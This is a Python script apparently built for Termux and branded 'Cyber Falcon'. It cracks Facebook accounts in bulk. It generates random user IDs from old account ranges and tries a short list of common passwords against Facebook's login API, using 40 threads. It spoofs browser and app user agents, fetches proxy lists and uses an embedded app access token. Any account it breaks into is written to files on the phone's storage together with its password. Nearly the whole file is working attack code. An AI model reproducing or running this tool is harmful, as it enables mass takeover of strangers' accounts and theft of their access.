import random
import requests
import sys
import time
import datetime
from datetime import datetime, date
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import getpass


akash="""
 ===================
 DECODE BY : 🦅🦅 Cyber Falcon🦅🦅
 FACEBOOK : 🦅🦅 Cyber Falcon🦅🦅
 =================== """
print(akash);time.sleep(1)


sys.stdout.write('\x1b]2; 𓆩🀪🦅【FALCAN᭄】㊝𓆪 🔥 \x07')

def request_storage_permission():
    try:
        open('/sdcard/@MdALAMGIR', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\x1b[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')

directories = ['/sdcard/ALAMGIR', '/sdcard/Md-ALAMGIR', '/sdcard/ALAMGIR/Md-ALAMGIR']
for folder_path in directories:
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        print(f'An error occurred while creating {folder_path}: {e}')

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('/sdcard/.proxy.txt', 'w').write(prox)
except Exception as e:
    print('')
    prox = open('/sdcard/.proxy.txt', 'r').read().splitlines()

successfull = []
G = '\x1b[1;92m'
W = '\x1b[0;97m'
Y = '\x1b[1;93m'
B = '\x1b[1;90m'
x = f'{G}➤{W}➤'
xy1 = f'{G}•{W}•'
xy = f'{G}━{W}➤'
ALAMGIR = f'{B}[{G}━{W}]'
op1 = f'{W}|{G}1{W}|'
op2 = f'{W}|{G}2{W}|'
op0 = f'{W}|{G}0{W}|'
ch = f'{W}|{G}?{W}|'

def line():
    print(f"{W}───────────────────────────────────────────────")

_month_ = {
    '1': 'January', '2': 'February', '3': 'March', '4': 'April',
    '5': 'May', '6': 'June', '7': 'July', '8': 'August',
    '9': 'September', '10': 'October', '11': 'November', '12': 'December'
}
date = datetime.now().day
month = _month_[str(datetime.now().month)]
year = datetime.now().year
date_and_year = f"{str(date)}\x1b[1;90m-\x1b[1;92m{str(month)}\x1b[1;90m-\x1b[1;92m{str(year)}"

def Banner():
    if 'Linux' in sys.platform.capitalize():
        os.system('clear')
    else:
        os.system('cls')
    return  """ 
@@@@@@.   🦅🦅🦅🦅@@.      @@@. 
@@.                       @           @@.    @.          
@@@@@@       @@.         @@    @.       
@@                   @    @.       @@.  @.        
@@.               @@@@@     @@.   @.         
@@             @.                @  @@      @@@.     
$$$$$$$$$$$F$$$A$$$$$L$$$$c$$$$o$$$N
"""

attemps = 0
while attemps < 12345677901:
    username = input(' \x1b[0;92mEnter Username: ')
    password = input(' \x1b[0;93mEnter Password: ')
    if username == 'Falcon' and password == 'MR':
        print(' \x1b[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
os.system('clear')

def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ('1000000000',): Md_dgk = '2009'
        elif uid[:9] in ('100000000',): Md_dgk = '2009'
        elif uid[:8] in ('10000000',): Md_dgk = '2009'
        elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'): Md_dgk = '2009'
        elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'): Md_dgk = '2010'
        elif uid[:6] in ('100001',): Md_dgk = '2010'
        elif uid[:6] in ('100002', '100003'): Md_dgk = '2011'
        elif uid[:6] in ('100004',): Md_dgk = '2012'
        elif uid[:6] in ('100005', '100006'): Md_dgk = '2013'
        elif uid[:6] in ('100007', '100008'): Md_dgk = '2014'
        elif uid[:6] in ('100009',): Md_dgk = '2015'
        elif uid[:5] in ('10001',): Md_dgk = '2016'
        elif uid[:5] in ('10002',): Md_dgk = '2017'
        elif uid[:5] in ('10003',): Md_dgk = '2018'
        elif uid[:5] in ('10004',): Md_dgk = '2019'
        elif uid[:5] in ('10005',): Md_dgk = '2020'
        elif uid[:5] in ('10006',): Md_dgk = '2021'
        elif uid[:5] in ('10009',): Md_dgk = '2023'
        elif uid[:5] in ('10007', '10008'): Md_dgk = '2022'
        else: Md_dgk = ''
    elif len(uid) in (9, 10): Md_dgk = '2008'
    elif len(uid) == 8: Md_dgk = '2007'
    elif len(uid) == 7: Md_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ('61',): Md_dgk = '2024'
    else: Md_dgk = ''
    return Md_dgk

def ua2():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'

def ua():
    rr = random.randint
    aZ = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA = random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx = random.randrange(1, 999)
    xx = f'Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'
    return xx

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f'Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(["2", "1"]))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f'Mozilla/5.0 (Windows NT 6.{str(random.choice(["2", "1"]))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'
    D = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'
    return random.choice([A, B, C, D])

def generate_user_ids(limit=None):
    if limit:
        return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
    return [str(random.randint(111111111, 999999999)) for _ in range(1000)]

def generate_user_agent():
    windows_versions = ['10.0', '6.3', '6.1']
    chrome_major = random.randint(90, 115)
    chrome_build = random.randint(4000, 5100)
    chrome_patch = random.randint(30, 150)
    chrome_minor = random.randint(0, 5)
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rand_letter1 = random.choice(letters)
    rand_letter2 = random.choice(letters)
    rand_number = random.randint(1, 999)
    user_agent = f'Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; Win64; x64){rand_letter1}{rand_number}{rand_letter2} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36'
    return user_agent

def fuck_xnxx():
    rr = random.randint
    aZ = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    url6 = f'Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'
    return url6

def fuck_xnxxxx():
    mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F'])
    url1 = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return url1

def fuck_xx():
    url3 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
    return url3

def ua():
    aa = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    return aa

def fuck_xnxxxxx():
    realmi = random.choice(['RMP2107', 'RMX3770', 'RMX2176', 'RMX3939', 'RMX3868'])
    url4 = '[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/' + realmi + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    return url4

ua = 'Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]'

def login(uid):
    try:
        session = requests.Session()
        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ua2(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger',
            }
            params = {
                'format': 'json',
                'email': uid,
                'password': pw,
                'credentials_type': 'device_based_login_password',
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
                'method': 'GET',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'fb_api_req_friendly_name': 'authenticate',
                'cpl': 'true',
            }
            response = session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers).json()
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/EHC_old.txt', 'a') as file:
                    file.write(f'[EHC-OK🦅?] {uid}|{pw}|{creationyear(uid)}')
                line()
                print(f'\r{xy1}{G} [EHC-OK🦅?] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f'\r{x}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
                line()
                open('/sdcard/EHC/OLD-UID/ALAMGIR_old_uid_ok.txt', 'a').write(f'[Md-OK] {uid} | {pw} | {creationyear(uid)}\n')
                successfull.append(str(uid) + '|' + str(pw))
                break
            elif 'session_key' in response or 'Please Confirm Email' in str(response):
                with open('/sdcard/EHC_old.txt', 'a') as file:
                    file.write(f'[EHC-OK🦅?] {uid}|{pw}|{creationyear(uid)}\n')
                print(f'\r{xy1}{G} [EHC-CP🦅?] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f'\r{xy1}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
                line()
                successfull.append(str(uid) + '|' + str(pw))
                break
        sys.stdout.write(f'\r\x1b[0;97m[\x1b[1;92m{date_and_year}\x1b[0;97m] \x1b[38;5;208m{uid}{W}|{G}{len(successfull)}{W} ')
    except Exception as e:
        time.sleep(5)

def main():
    print(Banner())
    print(f'{op1} CLONE 2011-2015')
    print(f'{op2} CLONE 2009-2010')
    print(f'{op0} {G}CONTACT DEVELOPER')
    line()
    choice = input(f'{ch} Select : ')
    print(Banner())
    if choice in ('1', '01'):
        MdALAMGIR = '100000'
    else:
        MdALAMGIR = '100000'

    if MdALAMGIR == '100000':
        print(f'{x} EXAMPLE {G}:{W} 1000 {G}|{W} 2000 {G}|{W} 5000 {G}|{W} 10000')
        line()
        limit = int(input(f'{ch} LIMIT {G}:{W} '))
        user_ids = generate_user_ids(limit)
    else:
        user_ids = generate_user_ids()

    print(Banner())
    print(f'{x} OK/CP IDS WILL BE SAVED IN {xy} /SDCARD')
    line()
    print(f'{x} TOTAL UID {xy} {len(user_ids)}')
    line()
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, [MdALAMGIR + uid for uid in user_ids])
    print()
    line()
    print(f'{x} PROGRAM FINISHED.')
    print(f'{x} TOTAL OK: {str(len(successfull))}/{str(len(successfull))}')
    line()
    input(' [ Press enter to back ]')
    main()

if __name__ == '__main__':
    main()
